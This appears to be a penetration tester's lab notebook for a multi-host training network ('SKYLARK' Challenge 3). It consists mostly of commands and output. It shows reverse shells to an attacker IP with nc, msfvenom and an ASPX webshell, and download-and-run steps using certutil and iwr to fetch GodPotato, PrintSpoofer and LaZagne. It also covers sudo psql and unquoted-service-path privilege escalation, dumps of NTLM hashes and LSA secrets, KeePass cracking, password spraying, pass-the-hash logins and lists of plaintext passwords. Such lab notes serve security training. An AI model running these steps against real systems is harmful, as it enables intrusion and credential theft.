/dev/mqueue                                                                                       
/dev/shm
/dev/shm/PostgreSQL.1567392851
/etc/postgresql
/etc/postgresql/12
/etc/postgresql/12/main
/etc/postgresql/12/main/conf.d
/etc/postgresql/12/main/environment
/etc/postgresql/12/main/pg_ctl.conf
/etc/postgresql/12/main/pg_hba.conf
/etc/postgresql/12/main/pg_ident.conf


		# REPLACE postgresql.conf with php shell - DIDNT WORK
postgres@singapore06:/etc/postgresql/12/main$ rm postgresql.conf
 
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/225]
â””â”€$ python3 -m http.server 80

postgres@singapore06:/etc/postgresql/12/main$ wget http://192.168.45.241:80/postgresql.conf

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nvlp 443
listening on [any] 443 ...

$ sudo /usr/bin/psql
Error: invalid line 1 in /etc/postgresql/12/main/postgresql.conf: <?php

$ sudo /usr/bin/psql
Error: invalid line 562 in /etc/postgresql/12/main/postgresql.conf: busybox nc 192.168.45.241 443 -e sh

$ sudo /usr/bin/psql
Error: invalid line 562 in /etc/postgresql/12/main/postgresql.conf: psql


				GTFOBINS:
		https://gtfobins.github.io/gtfobins/psql/

postgres@singapore06:/var/lib/postgresql/12/main$ sudo -l
Matching Defaults entries for postgres on singapore06:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User postgres may run the following commands on singapore06:
    (ALL) NOPASSWD: /usr/bin/psql

# Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
psql
\?
!/bin/sh

		This is because you don't have an interactive shell:
python3 -c 'import pty;pty.spawn("/bin/bash")' 

		make sure use SUDO and access the service:
sudo psql --host=127.0.0.1 -U postgres 
sudo psql -h localhost -d webapp -U postgres 
postgres:EAZT5EMULA75F8MC

		and use the payload to elevate your privileges:
\! /bin/sh 

root@singapore06:~# whoami
root

root@singapore06:~# hostname
singapore06

root@singapore06:~# cat proof.txt
e30c308fb0ee64a712c5e6753684aff0

-----------------------------------------------------------------------------------------
			192.168.225.226 Challenge 3 - VM 17 OS âœ…

HTTP: 5985 24680 47001
FileZilla: 24621
???: 2994
RPC: 135
SMB: 139 445

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.226

HTTP: 5985 24680 47001
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
24680/tcp open  http          syn-ack Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 492B0BD5C68472C87C73D847FBBA3106
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: &#x30DB;&#x30FC;&#x30E0; - Umbraco&#x30B5;&#x30F3;&#x30D7;&#x3...
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

???: 24621
24621/tcp open  unknown       syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck, SSLSessionReq, TerminalServerCookie: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|   GetRequest, Hello: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     What are you trying to do? Go away.
|   HTTPOptions, RTSPRequest: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     Wrong command.
|   Help: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     214-The following commands are recognized.
|     USER TYPE SYST SIZE RNTO RNFR RMD REST QUIT
|     HELP XMKD MLST MKD EPSV XCWD NOOP AUTH OPTS DELE
|     CDUP APPE STOR ALLO RETR PWD FEAT CLNT MFMT
|     MODE XRMD PROT ADAT ABOR XPWD MDTM LIST MLSD PBSZ
|     NLST EPRT PASS STRU PASV STAT PORT
|_    Help ok.

???: 2994
2994/tcp  open  veritas-vis2? syn-ack

RPC: 135
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC

SMB: 139 445
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25432/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19058/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 61222/udp): CLEAN (Failed to receive data)
|   Check 4 (port 54290/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 192.168.154.226
123/udp  open|filtered ntp
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike
5353/udp open|filtered zeroconf
5355/udp open|filtered llmnr

				SPRAY AND PRAY: 
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK]
â””â”€$ crackmapexec winrm 192.168.225.0/24 -u users.txt -p pass.txt --continue-on-success

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK]
â””â”€$ crackmapexec smb 192.168.225.0/24 -u users.txt -p pass.txt --shares
SMB         192.168.225.220 445    HOUSTON01        [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         192.168.225.221 445    AUSTIN02         [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               


				HTTP: 5985 24680 47001
http://192.168.225.226:5985/
http://192.168.225.226:47001/
Not Found
HTTP Error 404. The requested resource is not found.

			http://192.168.225.226:24680/
|_http-favicon: Unknown favicon MD5: 492B0BD5C68472C87C73D847FBBA3106

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ feroxbuster -u http://192.168.225.226:24680 -v

http://192.168.225.226:24680/cgi-bin
http://192.168.225.226:24680/images
200      GET      129l      248w     6120c http://192.168.225.226:24680/umbraco/

feroxbuster -u http://192.168.225.226:24680/cgi-bin -v

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ dirb http://192.168.225.226:24680
---- Scanning URL: http://192.168.225.226:24680/ ----
+ http://192.168.225.226:24680/about-us (CODE:301|SIZE:0)                                        
+ http://192.168.225.226:24680/blog (CODE:301|SIZE:0)                                            
+ http://192.168.225.226:24680/Blog (CODE:301|SIZE:0)                                            
+ http://192.168.225.226:24680/contact (CODE:301|SIZE:0)                                         
+ http://192.168.225.226:24680/Contact (CODE:301|SIZE:0)                                         
+ http://192.168.225.226:24680/favicon.ico (CODE:200|SIZE:15406)                                 
+ http://192.168.225.226:24680/install (CODE:302|SIZE:0)                                         
+ http://192.168.225.226:24680/people (CODE:301|SIZE:0)                                          
+ http://192.168.225.226:24680/People (CODE:301|SIZE:0)                                          
+ http://192.168.225.226:24680/products (CODE:301|SIZE:0)                                        
+ http://192.168.225.226:24680/Products (CODE:301|SIZE:0)                                        
+ http://192.168.225.226:24680/umbraco (CODE:200|SIZE:6120)   


				FileZilla: 24621
#filezilla
https://filezilla-project.org/download.php?type=client
https://filezillapro.com/docs/v3/basic-usage-instructions/install-filezilla-pro-on-debian-linux/
tar xf FileZilla_3.67.0_x86_64-linux-gnu.tar.xz
Launch FileZilla Pro with: FileZilla3/bin/filezilla
- Host: 192.168.230.226
- Username: ftp_jp
- password: ~be<3@6fe1Z:2e8
- Port: 24621

# DIRECTORY: / security.txt
Contact: mailto:security@skylark.jp
Expires: 2035-12-01T11+00+00.000Z

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nano /etc/hosts
192.168.230.226	skylark.jp

# WEBSITE ASPNET:
/aspnet_client/system_web
/aspnet_client/system_web/4_0_30319

# WWWROOT ACCESS: 
DIRECTORY: /
Copy /usr/share/webshells/aspx/cmdasp.aspx to your working directory. 
Upload it using put cmdasp.aspx in the root directory
and access it on port 24680
http://skylark.jp:24680/cmdasp.aspx

# REVERSE SHELL: 
https://www.revshells.com/
Powershell #3 Base64

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -lvnp 443
connect to [192.168.45.238] from (UNKNOWN) [192.168.225.226] 50270

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool

PS C:\windows\system32\inetsrv> hostname
tokyo07

PS C:\windows\system32\inetsrv> systeminfo
Host Name:                 TOKYO07
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-10000-00001-AA673
Original Install Date:     2022/11/16, 5:47:49
System Boot Time:          2024/04/12, 3:51:37
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC


				NETWORK:
PS C:\Users\j_local> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.225.226
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.225.254


				CREDS: 
#Powershell password hunting:
PS C:\Users\Public\Downloads> (Get-PSReadlineOption).HistorySavePath
Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# LaZagne: 
iwr -uri http://192.168.45.238:80/LaZagne.exe -Outfile laz.exe
PS C:\Users\Public\Downloads> PS C:\Users\Public\Downloads> .\laz.exe all
[+] 0 passwords have been found.


				PRIV ESC:
PS C:\windows\system32\inetsrv> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

#GODPOTATO - DIDNT WORK 
certutil.exe -urlcache -split -f "http://192.168.45.249/GodPotato-NET4.exe" GodPotato.exe
certutil.exe -urlcache -split -f "http://192.168.45.249/nc64.exe" nc64.exe
.\GodPotato.exe -cmd "C:\Users\Public\Downloads\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.249 80"

#PrintSpoofer64 - DIDNT WORK
iwr -uri http://192.168.45.249:80/PrintSpoofer64.exe -Outfile print.exe
.\print.exe -i -c powershell.exe
.\print.exe -i -c cmd.exe

REVERSE SHELL:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.249 LPORT=2560 -f exe > reverse.exe
iwr -uri http://192.168.45.249:80/reverse.exe -Outfile rev.exe

WINPEAS: 
iwr -uri http://192.168.45.249:80/winPEASx64.exe -Outfile winpea.exe
.\winpea.exe

          Í¹ Modifiable Services
  Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                     
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)

          Í¹ Current TCP Listening Ports
  Check for services restricted from the outside 
  Enumerating IPv4 connections
  TCP        127.0.0.1             1434          0.0.0.0               0               Listening         4208            sqlservr

          Í¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

   User Id         :        S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
   Event Id        :        4104
   Context         :        .EXAMPLE
The new binary path (lpBinaryPathName) to set for the specified service. Required.
.PARAMETER Path
net user john Password123! /add'
Sets the binary path for 'VulnSvc' to be a command to add a user.
.EXAMPLE
Get-Service VulnSvc | Set-ServiceBinaryPath -Path 'net user john Password123! /add'
   Created At      :        2022/12/05 7:18:17
   Command line    :        net user john Password123! /add'



			# Unquoted Service Path
https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107
https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae

# List of services with binary path
PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName
DevService                               Stopped C:\Skylark\Development Binaries 01\???????.exe   

# List of services with spaces and missing quotes in the binary path
PS C:\> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
DevService                               Stopped C:\Skylark\Development Binaries 01\???????.exe                        

PS C:\Skylark> cd 'Development Binaries 01'
PS C:\Skylark\Development Binaries 01> ls
    Directory: C:\Skylark\Development Binaries 01
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        2021/05/08      1:14          73728 ???????.exe   


PS C:\Skylark\Development Binaries 01> icacls 'C:\Skylark\Development Binaries 01\???????.exe'
C:\Skylark\Development Binaries 01\???????.exe Everyone:(I)(RX)
                                               BUILTIN\Administrators:(I)(F)
                                               NT AUTHORITY\SYSTEM:(I)(F)
                                               BUILTIN\Users:(I)(RX)

PS C:\Skylark\Development Binaries 01> icacls 'C:\Skylark'
icacls 'C:\Skylark'
C:\Skylark Everyone:(OI)(CI)(F)
           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
           BUILTIN\Administrators:(I)(OI)(CI)(F)
           BUILTIN\Users:(I)(OI)(CI)(RX)
           BUILTIN\Users:(I)(CI)(AD)
           BUILTIN\Users:(I)(CI)(WD)
           CREATOR OWNER:(I)(OI)(CI)(IO)(F)


REVERSE SHELL: C:\Skylark
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.249 LPORT=2560 -f exe > reverse.exe
PS C:\Skylark> certutil -f -urlcache http://192.168.45.249:80/reverse.exe Development.exe

# Using Start-Service and Stop-Service
Start-Service DevService
Stop-Service DevService
Restart-Service DevService

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -lvnp 2560
listening on [any] 2560 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.230.226] 50111
Microsoft Windows [Version 10.0.20348.1249]

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
tokyo07

				LOCAL/PROOF.txt
C:\Users\j_local\Desktop> dir
 Directory of C:\Users\j_local\Desktop
2024/05/18  19:51                34 local.txt
2022/12/05  10:42             2,542 Passwords.kdbx

C:\Users\j_local\Desktop> type local.txt
8e3024aaf7f90a04b5d1d17ff0ee66fe

C:\Users\Administrator\Desktop> dir
 Directory of C:\Users\Administrator\Desktop
2024/05/18  19:51                34 proof.txt

C:\Users\Administrator\Desktop> type proof.txt
cfc5decb5996bef79dc2e9b2541dfee8


				CREDS: 
#Powershell password hunting:
PS C:\Users\Public\Downloads> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
shutdown /r /t 7

# LaZagne: 
iwr -uri http://192.168.45.249:80/LaZagne.exe -Outfile laz.exe
PS C:\Users\j_local\Desktop> .\laz.exe all
.\laz.exe all
[+] System masterkey decrypted for 2a3c97e0-f90a-42d7-a467-531d9a6b5471
[+] System masterkey decrypted for 2edaf323-9b26-46ae-8097-312c03644775
[+] System masterkey decrypted for 3f93fabd-c4c6-43bc-834e-52b646f1635e
[+] System masterkey decrypted for a3c671d1-6a56-4516-b930-c6990b02b858
########## User: SYSTEM ##########
------------------- Hashdump passwords -----------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:90ebcd7b7e2b6be22a05ceb0bf486944:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:45da4fcaedf5fe7c2f2af1412bbdb13b:::
j_local:1001:aad3b435b51404eeaad3b435b51404ee:1b2c2fafad03b802bc20dc829ed3aeae:::
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: ec627fffff5c0996b7e81c8c373093d578861b4a
Nthash: 90ebcd7b7e2b6be22a05ceb0bf486944
Login: Administrator
------------------- Lsa_secrets passwords -----------------
DPAPI_SYSTEM
0000   01 00 00 00 F7 6F 6C B0 3C 37 86 62 14 23 32 44    .....ol.<7.b.#2D
0010   5A 96 F2 7C AC BE 90 90 A2 EE 69 44 94 D9 B0 EA    Z..|......iD....
0020   C6 35 37 68 31 AA 57 AC DC BE 5E 9E                .57h1.W...^.
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   7C 4B 84 F4 7E 30 E8 CE BC 7A E7 42 7C 51 EE 51    |K..~0...z.B|Q.Q
0020   21 CE 1E D3 CB 77 F5 56 4B 0F DB F8 F6 22 FD 9F    !....w.VK...."..
0030   1D EE 9D 6E E0 93 8C 2D 10 44 3C A0 88 89 78 85    ...n...-.D<...x.
0040   E4 72 50 1A 38 E8 E1 4B CB 11 B2 A5 2F 61 1B BB    .rP.8..K..../a..
0050   DA 32 0D 5E D9 E2 FE 76 85 BA FE 53 52 F1 BD E7    .2.^...v...SR...
_SC_MSSQLSERVER
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   56 45 BC F9 02 CC 93 80 51 4B B6 43 36 7D F0 61    VE......QK.C6}.a
_SC_SQLSERVERAGENT
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   B5 9A 0C 91 94 52 FF 7D 7C AC 79 5E 01 BF 66 42    .....R.}|.y^..fB
_SC_SQLTELEMETRY
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   47 C0 C8 A1 54 B8 43 08 AE 21 76 FB 8B CE 77 7A    G...T.C..!v...wz
[+] ec627fffff5c0996b7e81c8c373093d578861b4a ok for masterkey 1b5b6d7b-4a03-4ffb-82a8-7a1abb2c30aa
[+] ec627fffff5c0996b7e81c8c373093d578861b4a ok for masterkey 3e0afbb3-34fb-44e4-bb92-84eb2040f676
[+] ec627fffff5c0996b7e81c8c373093d578861b4a ok for masterkey 7f15f3f6-3607-4643-9727-6607d36aba39
[+] ec627fffff5c0996b7e81c8c373093d578861b4a ok for masterkey c43bf37d-a0d6-4c6c-b40c-b0e90c340ee7
[+] ec627fffff5c0996b7e81c8c373093d578861b4a ok for masterkey dbe432b3-098a-47df-aaa2-cdb3ec5240fc
########## User: j_local ##########
------------------- Keepassconfig passwords -----------------
[+] Keyfile found !!!
Keyfile: No keyfile found
Database: C:\Users\j_local\Desktop\Passwords.kdbx
Type: Password
[+] 2 passwords have been found.


				ACCCESS: 
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/226]
â””â”€$ evil-winrm -i 192.168.230.226 -u Administrator -H 90ebcd7b7e2b6be22a05ceb0bf486944

*Evil-WinRM* PS C:\Users\j_local> cd Desktop
*Evil-WinRM* PS C:\Users\j_local\Desktop> ls
    ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒª: C:\Users\j_local\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/18/2024  10:12 PM       11849245 laz.exe
-a----         5/18/2024   7:51 PM             34 local.txt
-a----         12/5/2022   9:42 AM           2542 Passwords.kdbx


*Evil-WinRM* PS C:\Users\j_local\Desktop> download Passwords.kdbx
Info: Downloading C:\Users\j_local\Desktop\Passwords.kdbx to Passwords.kdbx
Info: Download successful!


				CRACK .KDBX:
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/226]
â””â”€$ keepass2john Passwords.kdbx > keepass.hash

# REMOVE from .hash: Passwords:
nano keepass.hash 

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/226]
â””â”€$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ locate fasttrack.txt                     
/usr/share/wordlists/fasttrack.txt

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/226]
â””â”€$ hashcat -m 13400 keepass.hash /usr/share/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

$keepass$*2*60000*0*9a475aa95ec339bfb7208ed516c2db6d89c8ea2ed7e5358bcaeb9d9cbd27fd4b*0ed2bf2174533d3151071db0d86ce492fc78caedba8104a84301afbcf4fb77a1*28cb4f06d7e6abf69507a537211b3e2e*5d63c7a3e7328057af43fb167f242b0381a8b52c41ad228a6262f4d11d855034*3e0665c07b6c8b0c99314fc0160c553b4d006722009d868af93b4a013882159f:P@ssword!

				SPRAY AND PRAY: 
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/226]
â””â”€$ keepassxc
P@ssword!


j.local:5iQ78OU2JHAAKbQc5XAr
Hitoshi:xsYu9XPYNu9dBfHo8L4k
Hitoshi@skylark.com:ganbatteyo!123
ext_acc:DoNotShare!SkyLarkLegacyInternal2008
User Name:Password
Michael321:12345
ann.sales:B9aL9lbDOlNkGmJxusmi
P@ssword!


WINRM: 
crackmapexec winrm 172.16.230.0/24 -u users.txt -p pass.txt -d skylark.com --continue-on-success
crackmapexec winrm 192.168.230.0/24 -u users.txt -p pass.txt -d skylark.com --continue-on-success
crackmapexec winrm 10.10.190.0/24 -u users.txt -p pass.txt -d skylark.com --continue-on-success

SMB: 
crackmapexec smb 172.16.230.0/24 -u users.txt -p pass.txt --shares

crackmapexec smb 192.168.230.0/24 -u users.txt -p pass.txt --shares
SMB         192.168.230.220 445    HOUSTON01        [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         192.168.230.221 445    AUSTIN02         [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               


crackmapexec smb 10.10.190.0/24 -u users.txt -p pass.txt --shares
SMB         10.10.190.254   445    AUSTIN02         [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         10.10.190.250   445    DC               [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         10.10.190.240   445    HOUSTON01        [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         10.10.190.13    445    MAIL             [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         10.10.190.11    445    LAB              [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               


SSH: 
crackmapexec ssh 192.168.230.0/24 -u users.txt -p pass.txt --continue-on-success
crackmapexec ssh 10.10.190.0/24 -u users.txt -p pass.txt --continue-on-success

RDP: 
netexec rdp 10.10.190.0/24 -u users.txt -p pass.txt --continue-on-success

FTP: 



-----------------------------------------------------------------------------------------
		192.168.230.227	Challenge 3 - VM 18 OS âœ…
HTTP: 80
RDP: 3389

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.227

HTTP: 80
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

RDP: 3389
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=sydney08
| Issuer: commonName=sydney08
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-11T11:07:31
| Not valid after:  2024-10-11T11:07:31
| MD5:   a748:e5b8:4777:4ece:aff2:cd57:e9cb:2a0d
| SHA-1: ddc7:90c6:c9c6:7c69:846c:9e8b:3974:f111:fea2:2824
| rdp-ntlm-info: 
|   Target_Name: SYDNEY08
|   NetBIOS_Domain_Name: SYDNEY08
|   NetBIOS_Computer_Name: SYDNEY08
|   DNS_Domain_Name: sydney08
|   DNS_Computer_Name: sydney08
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-14T03:25:01+00:00
|_ssl-date: 2024-05-14T03:25:06+00:00; -3s from scanner time.


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 192.168.154.227
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 23:42 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.18 seconds

				HTTP: 80
Microsoft IIS httpd 10.0
http://192.168.154.227/
Decommissioned

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ feroxbuster -u http://192.168.230.227 -v
200      GET        3l        3w       57c http://192.168.230.227/
400      GET        6l       26w      324c http://192.168.230.227/error%1F_log

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ dirb http://192.168.230.227
 http://192.168.230.227/index.htm (CODE:200|SIZE:57)      


				RDP: 3389
CREDS FOUND: DC 250
- SYDNEY: DowntownAbbey1923

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ xfreerdp /u:Administrator /p:DowntownAbbey1923 /v:192.168.230.227 /size:80% /drive:kali,.

# Proof.txt
C:\Users\sydneyadmin\Desktop
7c89497ae225a7ebc4091aa60221897b


				CREDS: 
PS C:\Users\Administrator\Desktop> ls
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/12/2024   5:08 PM       11849245 LaZagne.exe

PS C:\Users\Administrator\Desktop> .\LaZagne.exe all
[+] System masterkey decrypted for 4415b697-6de1-4307-8894-a005db9844ff
[+] System masterkey decrypted for 65eaf2ad-567b-4aab-8400-694b14743a52
[+] System masterkey decrypted for a5f402bc-3d27-45b9-82f2-5248dd87c4e9
########## User: SYSTEM ##########
------------------- Hashdump passwords -----------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:be20b13c5ee4b4a520e0f35635e6d5ab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e403bc6debac4e01f93eeebad84a1ddd:::
sydneyadmin:1001:aad3b435b51404eeaad3b435b51404ee:20233f6fd164895afaccf65d5eb1991d:::
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: 6e3ea45f09d5ffd30d966d0bff5375d80e90204d
Nthash: be20b13c5ee4b4a520e0f35635e6d5ab
Login: Administrator
------------------- Lsa_secrets passwords -----------------
DPAPI_SYSTEM
0000   01 00 00 00 19 F0 5B 90 B7 B4 1F 71 5E 89 B1 29    ......[....q^..)
0010   C8 38 58 38 C6 2F 37 81 56 15 BA F0 4A C4 12 8A    .8X8./7.V...J...
0020   68 3F 7A C8 4C FE FD 4B 4C 2C 73 13                h?z.L..KL,s.
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   F9 DA 90 CE 6F E6 C2 5A D5 B6 44 D1 D8 03 2F 80    ....o..Z..D.../.
0020   AF 0F 16 03 AC 83 65 EA FA 23 7C 72 2B 5D 49 2A    ......e..#|r+]I*
0030   D3 05 F6 73 58 5C 29 BE 45 DD 04 59 02 38 96 4B    ...sX.).E..Y.8.K
0040   28 54 4C 8A C7 08 DD AA C5 D5 E6 69 33 67 3F BE    (TL........i3g?.
0050   A1 2A 18 3E DD EA 53 5E 88 BE E7 DB 10 9D D7 94    .*.>..S^........
[+] 6e3ea45f09d5ffd30d966d0bff5375d80e90204d ok for masterkey 7c212aec-0725-459d-a1b9-4aaa4f569cc6
[+] 6e3ea45f09d5ffd30d966d0bff5375d80e90204d ok for masterkey 7d93db9f-2c8b-442a-be00-bafa50ce19aa
[+] 6e3ea45f09d5ffd30d966d0bff5375d80e90204d ok for masterkey dd0d5e34-0425-4310-a2e1-3adaee3f92db
[+] 1 passwords have been found.


PS C:\Users\Administrator\Desktop> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\Administrator\Desktop> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
hostname
Rename-Computer -NewName sydney08
netsh advfirewall set allprofiles state off
Set-NewFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change standby-timeout-dc 0
